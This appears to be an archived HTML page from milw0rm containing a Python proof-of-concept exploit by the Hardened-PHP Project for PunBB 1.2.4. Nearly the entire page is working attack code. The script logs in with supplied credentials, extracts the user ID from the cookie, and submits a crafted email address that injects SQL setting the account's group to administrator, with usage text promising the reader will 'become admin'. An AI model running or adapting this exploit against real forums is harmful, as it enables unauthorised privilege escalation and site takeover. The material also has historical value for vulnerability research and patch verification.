@@ -1,0 +1,129 @@
+<html><head><title>PunBB 1.2.4 (change_email) SQL Injection Exploit</title></head><pre>#!/usr/bin/python
+#######################################################################
+#  _  _                _                     _       ___  _  _  ___
+# | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \
+# | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/
+# |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|
+#
+#######################################################################
+#         Proof of concept code from the Hardened-PHP Project
+#######################################################################
+#
+#                           -= PunBB 1.2.4 =-
+#                   change_email SQL injection exploit
+#
+#  user-supplied data within the database is still user-supplied data
+#
+#######################################################################
+
+import urllib
+import getopt
+import sys
+import string
+
+__argv__ = sys.argv
+
+def banner():
+   print &quot;PunBB 1.2.4 - change_email SQL injection exploit&quot;
+   print &quot;Copyright (C) 2005 Hardened-PHP Project\n&quot;
+
+def usage():
+   banner()
+   print &quot;Usage:\n&quot;
+   print &quot;   $ ./punbb_change_email.py [options]\n&quot;
+   print &quot;        -h http_url   url of the punBB forum to exploit&quot;
+   print &quot;                      f.e. http://www.forum.net/punBB/&quot;
+   print &quot;        -u username   punBB forum useraccount&quot;
+   print &quot;        -p password   punBB forum userpassword&quot;
+   print &quot;        -e email      email address where the admin leve activation email is sent&quot;
+   print &quot;        -d domain     catch all domain to catch \&quot;some-SQL-Query\&quot;@domain emails&quot;
+   print &quot;&quot;
+   sys.exit(-1)
+
+def main():
+   try:
+       opts, args = getopt.getopt(sys.argv[1:], &quot;h:u:p:e:d:&quot;)
+   except getopt.GetoptError:
+       usage()
+
+   if len(__argv__) &lt; 10:
+       usage()
+
+   username = None
+   password = None
+   email = None
+   domain = None
+   host = None
+   for o, arg in opts:
+       if o == &quot;-h&quot;:
+           host = arg
+       if o == &quot;-u&quot;:
+           username = arg
+       if o == &quot;-p&quot;:
+           password = arg
+       if o == &quot;-e&quot;:
+           email = arg
+       if o == &quot;-d&quot;:
+           domain = arg
+
+   # Printout banner
+   banner()
+
+   # Check if everything we need is there
+   if host == None:
+       print &quot;[-] need a host to connect to&quot;
+       sys.exit(-1)
+   if username == None:
+       print &quot;[-] username needed to continue&quot;
+       sys.exit(-1)
+   if password == None:
+       print &quot;[-] password needed to continue&quot;
+       sys.exit(-1)
+   if email == None:
+       print &quot;[-] email address needed to continue&quot;
+       sys.exit(-1)
+   if domain == None:
+       print &quot;[-] catch all domain needed to continue&quot;
+       sys.exit(-1)
+
+   # Retrive cookie
+   params = {
+       'req_username' : username,
+       'req_password' : password,
+       'form_sent' : 1
+   }
+
+   wclient = urllib.URLopener()
+
+   print &quot;[+] Connecting to retrieve cookie&quot;
+
+   req = wclient.open(host + &quot;/login.php?action=in&quot;, urllib.urlencode(params))
+   info = req.info()
+   if 'set-cookie' not in info:
+       print &quot;[-] Unable to retrieve cookie... something is wrong&quot;
+       sys.exit(-3)
+   cookie = info['set-cookie']
+   cookie = cookie[:string.find(cookie, ';')]
+   print &quot;[+] Cookie found - extracting user_id&quot;
+   user_id = cookie[string.find(cookie, &quot;%3A%22&quot;)+6:string.find(cookie, &quot;%22%3B&quot;)]
+   print &quot;[+] User-ID: %d&quot; % (int(user_id))
+   wclient.addheader('Cookie', cookie);
+
+   email = '&quot;' + email[:string.find(email, '@')] + '&quot;@' + email[string.find(email, '@')+1:] + ',&quot;\','
+   append = 'group_id=\'1'
+   email = email + ( ((50-len(append))-len(email)) * ' ' ) + append + '&quot;@' + domain
+
+   params = {
+       'req_new_email' : email,
+       'form_sent' : 1
+   }
+
+   print &quot;[+] Connecting to request change email&quot;
+   req = wclient.open(host + &quot;profile.php?action=change_email&amp;id=&quot; + user_id, urllib.urlencode(params))
+
+   print &quot;[+] Done... Now wait for the email. Log into punBB, go to the link in the email and become admin&quot;
+
+if __name__ == &quot;__main__&quot;:
+   main()
+
+# milw0rm.com [2005-04-11]</pre></html>
